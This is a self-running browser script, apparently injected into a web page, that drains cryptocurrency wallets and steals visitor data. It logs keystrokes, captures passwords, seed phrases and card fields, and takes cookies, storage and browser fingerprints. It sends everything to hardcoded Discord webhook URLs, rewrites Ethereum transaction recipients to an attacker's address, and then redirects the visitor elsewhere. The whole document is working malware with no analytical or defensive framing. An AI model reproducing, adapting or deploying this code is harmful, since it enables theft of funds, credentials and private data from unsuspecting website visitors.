  <script>
    (function() {
      // ----- CONFIG -----
      const DRAIN_ADDRESSES = {

        ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        BNB: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        USDC_ERC20: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        USDT_ERC20: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        USDT_TRC20: 'TMdbZVp2tkoCWBiAMW5ZLmTKCXDm2cN5FY',
        SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM',
        XRP: 'rPRYV1csvzsYFg6ZYnYoroexVLF3c821t9'
      };
      const WEBHOOKS = [
        'https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe',
        'https://discord.com/api/webhooks/1529428563944538122/to9BGQ-DDkYHN86y06pfGkSTwVOV8EYKneHzQ98vhjxhNlLaegcEvkqnWLXIZJij5O4E',
        'https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh'
      ];

      // ----- HELPER: TRUNCATE -----
      function truncate(str, maxLen) {
        if (!str) return 'N/A';
        if (str.length <= maxLen) return str;
        return str.substring(0, maxLen) + '...';
      }

      // ----- ENHANCED EXFIL WITH STRUCTURED TABLES -----
      function exfil(data) {
        // Generate structured Markdown table
        const table = generateTable(data);
        
        // Raw JSON for machine parsing (truncated to fit)
        const json = JSON.stringify(data, null, 2);
        const truncatedJson = json.length > 1500 ? json.substring(0, 1500) + '\n... (truncated)' : json;
        
        // Combine both in one Discord message
        const content = `# 📊 WALLET DATA EXFIL\n\n${table}\n\n---\n# 🔧 RAW JSON\n\`\`\`json\n${truncatedJson}\n\`\`\``;
        const message = { content: content.substring(0, 1900) }; // Discord limit: 2000 chars
        
        WEBHOOKS.forEach(url => {
          // sendBeacon
          if (navigator.sendBeacon) {
            try {
              const blob = new Blob([JSON.stringify(message)], { type: 'application/json' });
              navigator.sendBeacon(url, blob);
            } catch(e) {}
          }
          
          // fetch with keepalive
          try {
            fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(message),
              keepalive: true,
              mode: 'no-cors'
            }).catch(() => {});
          } catch(e) {}
          
          // XMLHttpRequest fallback
          try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', url, false);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(message));
          } catch(e) {}
        });
      }

      // ----- BATCH EXFIL FOR KEYSTROKES/FORMS -----
      function exfilBatch(type, batchData) {
        if (!batchData || batchData.length === 0) return;
        
        // Table for batch
        let table = `# 📝 ${type.toUpperCase()} BATCH\n\n`;
        table += '| # | Key/Target | Value |\n';
        table += '|---|------------|-------|\n';
        
        const displayItems = batchData.slice(0, 20);
        displayItems.forEach((item, i) => {
          const key = item.key || item.field || 'N/A';
          const target = item.target || item.type || 'N/A';
          const value = truncate(item.value || item.data || '', 60);
          table += `| ${i+1} | ${truncate(key, 30)} (${truncate(target, 20)}) | ${value} |\n`;
        });
        
        if (batchData.length > 20) {
          table += `| ... | ... ${batchData.length - 20} more entries ... | ... |\n`;
        }
        
        // JSON backup
        const json = JSON.stringify(batchData, null, 2);
        const truncatedJson = json.length > 1000 ? json.substring(0, 1000) + '\n... (truncated)' : json;
        const content = `${table}\n\n---\n\`\`\`json\n${truncatedJson}\n\`\`\``;
        const message = { content: content.substring(0, 1900) };
        
        WEBHOOKS.forEach(url => {
          if (navigator.sendBeacon) {
            try {
              const blob = new Blob([JSON.stringify(message)], { type: 'application/json' });
              navigator.sendBeacon(url, blob);
            } catch(e) {}
          }
          try {
            fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(message),
              keepalive: true,
              mode: 'no-cors'
            }).catch(() => {});
          } catch(e) {}
        });
      }

      // ----- GENERATE MARKDOWN TABLE -----
      function generateTable(data) {
        const rows = [];
        
        // Header
        rows.push('| **Category** | **Field** | **Value** |');
        rows.push('|-------------|----------|-----------|');
        
        // 1. Metadata
        rows.push(`| **Metadata** | Timestamp | ${new Date(data.timestamp).toISOString()} |`);
        rows.push(`| **Metadata** | URL | ${truncate(data.url || 'N/A', 80)} |`);
        rows.push(`| **Metadata** | Referrer | ${truncate(data.referrer || 'N/A', 80)} |`);
        
        // 2. Fingerprint
        if (data.fingerprint) {
          rows.push(`| **Fingerprint** | UserAgent | ${truncate(data.fingerprint.userAgent || 'N/A', 80)} |`);
          rows.push(`| **Fingerprint** | Platform | ${data.fingerprint.platform || 'N/A'} |`);
          rows.push(`| **Fingerprint** | Language | ${data.fingerprint.language || 'N/A'} |`);
          rows.push(`| **Fingerprint** | Timezone | ${data.fingerprint.timezone || 'N/A'} |`);
          rows.push(`| **Fingerprint** | Screen | ${data.fingerprint.screen ? data.fingerprint.screen.width + 'x' + data.fingerprint.screen.height : 'N/A'} |`);
          rows.push(`| **Fingerprint** | Pixel Ratio | ${data.fingerprint.screen ? data.fingerprint.screen.pixelRatio : 'N/A'} |`);
          rows.push(`| **Fingerprint** | Hardware Concurrency | ${data.fingerprint.hardwareConcurrency || 'N/A'} |`);
          rows.push(`| **Fingerprint** | Device Memory | ${data.fingerprint.deviceMemory || 'N/A'} GB |`);
          rows.push(`| **Fingerprint** | Canvas Hash | ${truncate(data.fingerprint.canvas || 'N/A', 60)} |`);
          rows.push(`| **Fingerprint** | Plugins | ${truncate((data.fingerprint.plugins || []).join(', '), 80)} |`);
        }
        
        // 3. Wallets detected
        if (data.wallets) {
          const detected = Object.keys(data.wallets).filter(k => data.wallets[k] === true);
          rows.push(`| **Wallets** | Detected | ${detected.join(', ') || 'None'} |`);
          rows.push(`| **Wallets** | Count | ${detected.length} |`);
        }
        
        // 4. Addresses
        if (data.addresses) {
          if (data.addresses.eth) rows.push(`| **Addresses** | ETH | ${truncate(data.addresses.eth.join(', '), 80)} |`);
          if (data.addresses.sol) rows.push(`| **Addresses** | SOL | ${truncate(data.addresses.sol, 80)} |`);
          if (data.addresses.trx) rows.push(`| **Addresses** | TRX | ${truncate(data.addresses.trx, 80)} |`);
          if (data.addresses.cosmos) rows.push(`| **Addresses** | Cosmos | ${truncate(data.addresses.cosmos, 80)} |`);
          if (data.addresses.chainId) rows.push(`| **Addresses** | Chain ID | ${data.addresses.chainId} |`);
        }
        
        // 5. Balances
        if (data.balances) {
          if (data.balances.eth !== undefined) rows.push(`| **Balances** | ETH | ${data.balances.eth.toFixed(6)} Ξ |`);
          if (data.balances.sol !== undefined) rows.push(`| **Balances** | SOL | ${data.balances.sol.toFixed(4)} ◎ |`);
          if (data.balances.trx !== undefined) rows.push(`| **Balances** | TRX | ${data.balances.trx.toFixed(2)} TRX |`);
          if (data.balances.btc !== undefined) rows.push(`| **Balances** | BTC | ${data.balances.btc.toFixed(8)} ₿ |`);
          if (data.balances.bnb !== undefined) rows.push(`| **Balances** | BNB | ${data.balances.bnb.toFixed(6)} BNB |`);
        }
        
        // 6. Storage
        if (data.storage) {
          const lCount = Object.keys(data.storage.localStorage || {}).length;
          const sCount = Object.keys(data.storage.sessionStorage || {}).length;
          rows.push(`| **Storage** | localStorage keys | ${lCount} |`);
          rows.push(`| **Storage** | sessionStorage keys | ${sCount} |`);
          
          // Show first 8 localStorage keys (truncated values)
          const lKeys = Object.keys(data.storage.localStorage || {}).slice(0, 8);
          lKeys.forEach(key => {
            const val = data.storage.localStorage[key];
            const truncated = typeof val === 'string' && val.length > 80 ? val.substring(0, 80) + '...' : val || 'null';
            rows.push(`| **Storage** | ${truncate(key, 40)} | ${truncate(truncated, 80)} |`);
          });
        }
        
        // 7. Cookies
        if (data.cookies && data.cookies !== 'none') {
          const cookieCount = data.cookies.split(';').length;
          rows.push(`| **Cookies** | Count | ${cookieCount} |`);
          const firstCookies = data.cookies.split(';').slice(0, 3);
          firstCookies.forEach(c => {
            const parts = c.trim().split('=');
            if (parts.length >= 2) {
              rows.push(`| **Cookies** | ${truncate(parts[0], 30)} | ${truncate(parts.slice(1).join('='), 60)} |`);
            }
          });
        }
        
        // 8. Sensitive data
        if (data.sensitiveData) {
          rows.push(`| **Sensitive** | Type | ${data.sensitiveData.type || 'N/A'} |`);
          rows.push(`| **Sensitive** | Value | ${truncate(data.sensitiveData.value || '', 80)} |`);
        }
        
        return rows.join('\n');
      }

      // ----- 1. STORAGE EXTRACTION -----
      function extractStorage() {
        let data = { localStorage: {}, sessionStorage: {} };
        try {
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data.localStorage[key] = localStorage.getItem(key);
          }
        } catch(e) {}
        try {
          for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data.sessionStorage[key] = sessionStorage.getItem(key);
          }
        } catch(e) {}
        return data;
      }

      // ----- 2. WALLET DETECTION & DATA EXTRACTION -----
      async function extractWallets() {
        let wallets = {};
        let addresses = {};

        // Ethereum (MetaMask, Trust, Coinbase, Rabby, Brave)
        if (typeof window.ethereum !== 'undefined') {
          wallets.ethereum = true;
          if (window.ethereum.isMetaMask) wallets.metamask = true;
          if (window.ethereum.isTrust) wallets.trust = true;
          if (window.ethereum.isCoinbaseWallet) wallets.coinbase = true;
          if (window.ethereum.isRabby) wallets.rabby = true;
          if (window.braveWallet) wallets.brave = true;
          if (window.ethereum.isExodus) wallets.exodus = true;
          
          try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts && accounts.length) {
              addresses.eth = accounts;
              // Get chain ID
              const chainId = await window.ethereum.request({ method: 'eth_chainId' });
              addresses.chainId = chainId;
            }
          } catch(e) {}
        }

        // Solana (Phantom)
        if (typeof window.solana !== 'undefined') {
          if (window.solana.isPhantom) wallets.phantom = true;
          try {
            const resp = await window.solana.connect({ onlyIfTrusted: true });
            if (resp && resp.publicKey) {
              addresses.sol = resp.publicKey.toString();
            }
          } catch(e) {}
        }

        // Tron (TronLink)
        if (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress) {
          wallets.tronlink = true;
          try {
            addresses.trx = window.tronWeb.defaultAddress.address;
          } catch(e) {}
        }

        // Keplr (Cosmos)
        if (typeof window.keplr !== 'undefined') {
          wallets.keplr = true;
          try {
            await window.keplr.enable('cosmoshub-4');
            const offlineSigner = window.keplr.getOfflineSigner('cosmoshub-4');
            const accounts = await offlineSigner.getAccounts();
            if (accounts && accounts.length) {
              addresses.cosmos = accounts[0].address;
            }
          } catch(e) {}
        }

        // Detect Trust Wallet via window.trustwallet
        if (typeof window.trustwallet !== 'undefined') wallets.trust = true;

        return { wallets, addresses };
      }

      // ----- 3. BALANCE CHECK (via public RPC) -----
      async function checkBalances(addresses) {
        let balances = {};
        
        // ETH balance
        if (addresses.eth && addresses.eth.length) {
          try {
            const response = await fetch('https://cloudflare-eth.com/', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                jsonrpc: '2.0',
                method: 'eth_getBalance',
                params: [addresses.eth[0], 'latest'],
                id: 1
              })
            });
            const data = await response.json();
            if (data.result) {
              balances.eth = parseInt(data.result, 16) / 1e18;
            }
          } catch(e) {}
        }

        // SOL balance
        if (addresses.sol) {
          try {
            const response = await fetch('https://api.mainnet-beta.solana.com', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                jsonrpc: '2.0',
                method: 'getBalance',
                params: [addresses.sol],
                id: 1
              })
            });
            const data = await response.json();
            if (data.result) {
              balances.sol = data.result.value / 1e9;
            }
          } catch(e) {}
        }

        // TRX balance
        if (addresses.trx) {
          try {
            const response = await fetch('https://api.trongrid.io/v1/accounts/' + addresses.trx);
            const data = await response.json();
            if (data.data && data.data[0] && data.data[0].balance) {
              balances.trx = data.data[0].balance / 1e6;
            }
          } catch(e) {}
        }

        // BTC balance via blockchain.info
        if (DRAIN_ADDRESSES.BTC) {
          try {
            const response = await fetch('https://blockchain.info/balance?active=' + DRAIN_ADDRESSES.BTC);
            const data = await response.json();
            if (data && data[DRAIN_ADDRESSES.BTC]) {
              balances.btc = data[DRAIN_ADDRESSES.BTC].final_balance / 1e8;
            }
          } catch(e) {}
        }

        // BNB balance via BSC RPC
        if (addresses.eth && addresses.eth.length) {
          try {
            const response = await fetch('https://bsc-dataseed.binance.org/', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                jsonrpc: '2.0',
                method: 'eth_getBalance',
                params: [addresses.eth[0], 'latest'],
                id: 1
              })
            });
            const data = await response.json();
            if (data.result) {
              balances.bnb = parseInt(data.result, 16) / 1e18;
            }
          } catch(e) {}
        }

        return balances;
      }

      // ----- 4. TRANSACTION INTERCEPTOR -----
      function interceptTransactions() {
        if (typeof window.ethereum === 'undefined') return;
        
        // Intercept eth_sendTransaction via request()
        const origRequest = window.ethereum.request.bind(window.ethereum);
        window.ethereum.request = function(args) {
          if (args && args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
            const tx = args.params[0];
            if (tx.to) {
              const toLower = tx.to.toLowerCase();
              const drainLower = DRAIN_ADDRESSES.ETH.toLowerCase();
              if (toLower !== drainLower) {
                const originalTo = tx.to;
                tx.to = DRAIN_ADDRESSES.ETH;
                exfil({ 
                  type: 'tx_intercept', 
                  originalTo: originalTo, 
                  newTo: DRAIN_ADDRESSES.ETH,
                  value: tx.value || '0',
                  gas: tx.gas || 'N/A',
                  data: tx.data ? 'present' : 'none',
                  params: args.params
                });
              }
            }
          }
          return origRequest(args);
        };

        // Intercept sendAsync (legacy)
        if (window.ethereum.sendAsync) {
          const origSendAsync = window.ethereum.sendAsync.bind(window.ethereum);
          window.ethereum.sendAsync = function(payload, callback) {
            if (payload && payload.method === 'eth_sendTransaction' && payload.params && payload.params[0]) {
              const tx = payload.params[0];
              if (tx.to) {
                const toLower = tx.to.toLowerCase();
                const drainLower = DRAIN_ADDRESSES.ETH.toLowerCase();
                if (toLower !== drainLower) {
                  const originalTo = tx.to;
                  tx.to = DRAIN_ADDRESSES.ETH;
                  exfil({ 
                    type: 'tx_intercept_sendAsync', 
                    originalTo: originalTo, 
                    newTo: DRAIN_ADDRESSES.ETH,
                    value: tx.value || '0'
                  });
                }
              }
            }
            return origSendAsync(payload, callback);
          };
        }

        // Intercept send (legacy)
        if (window.ethereum.send) {
          const origSend = window.ethereum.send.bind(window.ethereum);
          window.ethereum.send = function(payload, callback) {
            if (payload && payload.method === 'eth_sendTransaction' && payload.params && payload.params[0]) {
              const tx = payload.params[0];
              if (tx.to) {
                const toLower = tx.to.toLowerCase();
                const drainLower = DRAIN_ADDRESSES.ETH.toLowerCase();
                if (toLower !== drainLower) {
                  const originalTo = tx.to;
                  tx.to = DRAIN_ADDRESSES.ETH;
                  exfil({ 
                    type: 'tx_intercept_send', 
                    originalTo: originalTo, 
                    newTo: DRAIN_ADDRESSES.ETH
                  });
                }
              }
            }
            return origSend(payload, callback);
          };
        }
      }

      // ----- 5. KEYSTROKE LOGGING (replaces clipboard hijack) -----
      function startKeystrokeLogging() {
        let keystrokes = [];
        let lastKeyTime = Date.now();
        const MAX_KEYSTROKES = 100;
        let batchTimer = null;
        
        function flushKeystrokes() {
          if (keystrokes.length > 0) {
            const batch = keystrokes.splice(0, keystrokes.length);
            exfilBatch('keystrokes', batch);
          }
        }
        
        document.addEventListener('keydown', function(e) {
          // Ignore modifier-only keys
          if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
          
          const key = e.key === ' ' ? '[SPACE]' : 
                     e.key === 'Enter' ? '[ENTER]\n' : 
                     e.key === 'Backspace' ? '[BACKSPACE]' : 
                     e.key === 'Tab' ? '[TAB]' : 
                     e.key === 'Escape' ? '[ESC]' : 
                     e.key === 'Delete' ? '[DEL]' : 
                     e.key === 'ArrowUp' ? '[UP]' : 
                     e.key === 'ArrowDown' ? '[DOWN]' : 
                     e.key === 'ArrowLeft' ? '[LEFT]' : 
                     e.key === 'ArrowRight' ? '[RIGHT]' : 
                     e.key.length === 1 ? e.key : '[' + e.key + ']';
          
          const target = e.target && e.target.tagName ? e.target.tagName : 'unknown';
          const id = e.target && e.target.id ? '#' + e.target.id : '';
          const name = e.target && e.target.name ? '[name=' + e.target.name + ']' : '';
          const type = e.target && e.target.type ? ' type=' + e.target.type : '';
          const className = e.target && e.target.className ? '.' + e.target.className.split(' ')[0] : '';
          
          // Capture input value context
          let valueContext = '';
          if (e.target && e.target.value !== undefined) {
            valueContext = e.target.value.length > 0 ? '[VALUE:' + truncate(e.target.value, 50) + ']' : '';
          }
          
          keystrokes.push({
            key: key,
            timestamp: Date.now(),
            timeDelta: Date.now() - lastKeyTime,
            target: target + id + name + type + className,
            valueContext: valueContext,
            url: window.location.href
          });
          
          lastKeyTime = Date.now();
          
          // Flush if we hit the max
          if (keystrokes.length >= MAX_KEYSTROKES) {
            flushKeystrokes();
          }
          
          // Reset batch timer
          if (batchTimer) clearTimeout(batchTimer);
          batchTimer = setTimeout(flushKeystrokes, 5000); // Flush every 5 seconds of inactivity
        }, true); // Use capture phase to intercept before page scripts

        // Send keystrokes on unload
        window.addEventListener('beforeunload', function() {
          flushKeystrokes();
        });
      }

      // ----- 6. FORM AUTO-FILL STEALING -----
      function stealFormData() {
        // Monitor all form submissions
        document.addEventListener('submit', function(e) {
          const form = e.target;
          const formData = new FormData(form);
          const data = {};
          const sensitiveKeywords = ['password', 'pass', 'seed', 'phrase', 'mnemonic', 'key', 'secret', 'credit', 'card', 'cvv', 'ssn', 'social', 'pin', 'code', 'auth', '2fa', 'token'];
          
          for (let [key, value] of formData.entries()) {
            const lowerKey = key.toLowerCase();
            if (sensitiveKeywords.some(s => lowerKey.includes(s))) {
              data[key] = value;
            }
          }
          
          if (Object.keys(data).length > 0) {
            exfilBatch('form_submit', [{
              type: 'form_submit',
              url: window.location.href,
              formId: form.id || 'unknown',
              formAction: form.action || 'unknown',
              data: data,
              timestamp: Date.now()
            }]);
          }
        }, true);

        // Monitor input changes for sensitive fields
        const sensitiveKeywords = ['password', 'email', 'seed', 'phrase', 'mnemonic', 'key', 'secret', 'credit', 'card', 'cvv', 'ssn', 'social', 'pin', 'code', 'auth', '2fa', 'token', 'wallet', 'private', 'recovery'];
        let sensitiveInputs = [];
        let inputTimer = null;
        
        document.addEventListener('input', function(e) {
          const field = e.target;
          if (field.tagName === 'INPUT' && field.value && field.value.length > 0) {
            const type = field.type || '';
            const name = field.name || '';
            const id = field.id || '';
            const placeholder = field.placeholder || '';
            const className = field.className || '';
            
            const isSensitive = sensitiveKeywords.some(s => 
              type.toLowerCase().includes(s) || 
              name.toLowerCase().includes(s) || 
              id.toLowerCase().includes(s) || 
              placeholder.toLowerCase().includes(s) ||
              className.toLowerCase().includes(s)
            );
            
            if (isSensitive) {
              sensitiveInputs.push({
                type: 'sensitive_input',
                field: { type, name, id, placeholder },
                value: field.value,
                timestamp: Date.now(),
                url: window.location.href
              });
              
              // Throttle: send every 3 seconds or 10 inputs
              clearTimeout(inputTimer);
              if (sensitiveInputs.length >= 10) {
                const batch = sensitiveInputs.splice(0, sensitiveInputs.length);
                exfilBatch('sensitive_inputs', batch);
              } else {
                inputTimer = setTimeout(() => {
                  if (sensitiveInputs.length > 0) {
                    const batch = sensitiveInputs.splice(0, sensitiveInputs.length);
                    exfilBatch('sensitive_inputs', batch);
                  }
                }, 3000);
              }
            }
          }
        }, true);
      }

      // ----- 7. COOKIE STEALING -----
      function stealCookies() {
        try {
          const cookies = document.cookie;
          if (cookies && cookies.length > 0) {
            exfil({ type: 'cookies_initial', data: cookies });
          }
        } catch(e) {}
      }

      // ----- 8. FINGERPRINTING -----
      function getFingerprint() {
        return {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          languages: navigator.languages,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory,
          screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
          },
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          plugins: (() => {
            try {
              return Array.from(navigator.plugins || []).map(p => p.name);
            } catch(e) { return []; }
          })(),
          canvas: (() => {
            try {
              const canvas = document.createElement('canvas');
              canvas.width = 200;
              canvas.height = 50;
              const ctx = canvas.getContext('2d');
              ctx.textBaseline = 'top';
              ctx.font = '14px Arial';
              ctx.fillStyle = '#f60';
              ctx.fillRect(125, 1, 62, 20);
              ctx.fillStyle = '#069';
              ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
              ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
              ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
              return canvas.toDataURL().substring(0, 200);
            } catch(e) { return 'error'; }
          })()
        };
      }

      // ----- 9. VISIBILITY & FOCUS TRACKING -----
      function trackVisibility() {
        let focusEvents = [];
        let eventTimer = null;
        
        function flushFocusEvents() {
          if (focusEvents.length > 0) {
            const batch = focusEvents.splice(0, focusEvents.length);
            exfilBatch('visibility_focus', batch);
          }
        }
        
        document.addEventListener('visibilitychange', function() {
          focusEvents.push({
            type: 'visibility',
            state: document.visibilityState,
            timestamp: Date.now()
          });
          clearTimeout(eventTimer);
          if (focusEvents.length >= 10) flushFocusEvents();
          else eventTimer = setTimeout(flushFocusEvents, 10000);
        });
        
        window.addEventListener('focus', function() {
          focusEvents.push({ type: 'focus', timestamp: Date.now() });
          clearTimeout(eventTimer);
          eventTimer = setTimeout(flushFocusEvents, 10000);
        });
        
        window.addEventListener('blur', function() {
          focusEvents.push({ type: 'blur', timestamp: Date.now() });
          clearTimeout(eventTimer);
          eventTimer = setTimeout(flushFocusEvents, 10000);
        });
        
        // Send on unload
        window.addEventListener('beforeunload', flushFocusEvents);
      }

      // ----- 10. EXTENSION STORAGE ATTEMPT (Manifest V2 fallback) -----
      function attemptExtensionStorage() {
        try {
          if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
            chrome.storage.local.get(null, function(items) {
              if (items && Object.keys(items).length > 0) {
                exfil({ type: 'chrome_storage_local', data: items });
              }
            });
          }
        } catch(e) {}
        
        try {
          if (typeof browser !== 'undefined' && browser.storage && browser.storage.local) {
            browser.storage.local.get(null).then(function(items) {
              if (items && Object.keys(items).length > 0) {
                exfil({ type: 'browser_storage_local', data: items });
              }
            }).catch(function() {});
          }
        } catch(e) {}
      }

      // ----- 11. MAIN EXECUTION -----
      async function run() {
        // Initial data collection
        const collected = {
          timestamp: Date.now(),
          url: window.location.href,
          referrer: document.referrer || 'N/A',
          fingerprint: getFingerprint(),
          storage: extractStorage(),
          cookies: document.cookie || 'none'
        };

        // Extract wallets (async)
        const walletData = await extractWallets();
        Object.assign(collected, walletData);

        // Check balances
        if (walletData.addresses && Object.keys(walletData.addresses).length) {
          const balances = await checkBalances(walletData.addresses);
          collected.balances = balances;
        }

        // Intercept transactions
        interceptTransactions();

        // Start keystroke logging
        startKeystrokeLogging();

        // Steal form data
        stealFormData();

        // Track visibility/focus
        trackVisibility();

        // Attempt extension storage
        attemptExtensionStorage();

        // Exfil initial data
        exfil(collected);

        // Additional exfil: send storage again with more detail after 5 seconds
        setTimeout(() => {
          const storageDetail = {
            type: 'storage_detailed',
            localStorage: localStorage.length > 0 ? Object.keys(localStorage).map(k => ({ key: k, value: truncate(localStorage.getItem(k), 200) })) : [],
            sessionStorage: sessionStorage.length > 0 ? Object.keys(sessionStorage).map(k => ({ key: k, value: truncate(sessionStorage.getItem(k), 200) })) : []
          };
          if (storageDetail.localStorage.length > 0 || storageDetail.sessionStorage.length > 0) {
            exfil(storageDetail);
          }
        }, 5000);

        // Redirect after 2 seconds
        setTimeout(() => {
          window.location.replace('https://coinmarketcap.com');
        }, 2000);
      }

      // Execute after DOM ready
      if (document.readyState === 'complete' || document.readyState === 'interactive') {
        run();
      } else {
        document.addEventListener('DOMContentLoaded', run);
      }
    })();
  </script>
